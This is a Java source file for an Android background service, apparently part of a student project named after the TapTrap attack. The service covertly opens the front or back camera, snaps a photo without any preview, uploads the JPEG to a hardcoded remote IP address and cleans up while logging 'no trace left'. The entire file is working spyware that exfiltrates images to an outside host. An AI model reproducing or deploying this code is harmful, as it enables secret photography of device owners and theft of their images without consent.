package com.example.inf2007_mad_j1847.test;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;

public class CameraService extends Service {

    private static final String TAG = "TapTrap-Camera";
    private static final String SERVER_URL = "http://20.2.66.175:9090/upload_photo";

    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    public static final String EXTRA_LENS = "lens"; // "front" or "back"

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String lens = intent.getStringExtra(EXTRA_LENS);
        boolean useFront = "front".equals(lens);

        startBackgroundThread();
        takePhoto(useFront);

        return START_NOT_STICKY;
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            backgroundThread = null;
            backgroundHandler = null;
        }
    }

    private void takePhoto(boolean useFront) {
        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String cameraId = null;

            // Find front or back camera
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (useFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    cameraId = id;
                    break;
                } else if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }

            if (cameraId == null) {
                Log.e(TAG, "Camera not found!");
                stopSelf();
                return;
            }

            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image != null) {
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    image.close();

                    // Upload then delete
                    uploadAndDelete(bytes);
                }
            }, backgroundHandler);

            final String finalCameraId = cameraId;
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(
                                CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(imageReader.getSurface());

                        camera.createCaptureSession(
                                java.util.Collections.singletonList(imageReader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        captureSession = session;
                                        try {
                                            session.capture(builder.build(), null, backgroundHandler);
                                            Log.d(TAG, "📸 Photo captured!");
                                        } catch (CameraAccessException e) {
                                            Log.e(TAG, "Capture failed: " + e.getMessage());
                                        }
                                    }
                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession session) {
                                        Log.e(TAG, "Session config failed");
                                        stopSelf();
                                    }
                                }, backgroundHandler);
                    } catch (CameraAccessException e) {
                        Log.e(TAG, "Camera access failed: " + e.getMessage());
                    }
                }

                @Override
                public void onDisconnected(CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                }

                @Override
                public void onError(CameraDevice camera, int error) {
                    Log.e(TAG, "Camera error: " + error);
                    camera.close();
                    stopSelf();
                }
            }, backgroundHandler);

        } catch (CameraAccessException | SecurityException e) {
            Log.e(TAG, "Failed: " + e.getMessage());
            stopSelf();
        }
    }

    private void uploadAndDelete(byte[] jpegData) {
        new Thread(() -> {
            try {
                // Upload to server
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "image/jpeg");
                conn.setRequestProperty("Content-Length", String.valueOf(jpegData.length));

                OutputStream os = conn.getOutputStream();
                os.write(jpegData);
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "📤 Photo uploaded! Response: " + responseCode);
                conn.disconnect();

            } catch (Exception e) {
                Log.e(TAG, "Upload failed: " + e.getMessage());
            } finally {
                // Cleanup and stop service
                cleanup();
                stopSelf();
            }
        }).start();
    }

    private void cleanup() {
        if (captureSession != null) { captureSession.close(); captureSession = null; }
        if (cameraDevice != null) { cameraDevice.close(); cameraDevice = null; }
        if (imageReader != null) { imageReader.close(); imageReader = null; }
        stopBackgroundThread();
        Log.d(TAG, "🗑️ Camera cleaned up, no trace left!");
    }

    @Override
    public void onDestroy() {
        cleanup();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}